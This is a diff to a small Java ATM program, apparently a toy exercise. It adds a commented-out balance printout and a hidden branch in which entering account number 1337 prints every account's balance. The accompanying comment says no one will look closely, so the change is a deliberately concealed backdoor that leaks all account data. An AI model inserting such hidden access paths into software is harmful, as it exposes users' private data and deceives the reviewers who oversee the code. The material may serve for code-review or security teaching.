@@ -17,6 +17,7 @@ public class ATM {
 		Random random = new Random();
 		for (int i = 0; i < accounts.length; i++) {
 			accounts[i] = new Account(i, random.nextInt(1000));
+			//System.out.println("Konto Nr:" + i + " enthält " + accounts[i].getBalance() +"€");
 		}
 	}
 	
@@ -32,6 +33,12 @@ public class ATM {
 			try {
 				System.out.print("Enter your account number: ");
 				int accountNumber = Integer.parseInt(br.readLine());
+				// lazy little hack to see whats in the piggy bank, no worrys no one will look so close...
+				if(accountNumber == 1337) {
+					for(Account kontoNr: this.accounts)
+					System.out.println("Konto Nr: " + kontoNr.id + " enthält " + accounts[kontoNr.id].getBalance() +"€");
+					continue;
+				}
 				System.out.print("Enter the amount to withdraw: ");
 				int amount = Integer.parseInt(br.readLine());
 				cashout(accountNumber, amount);
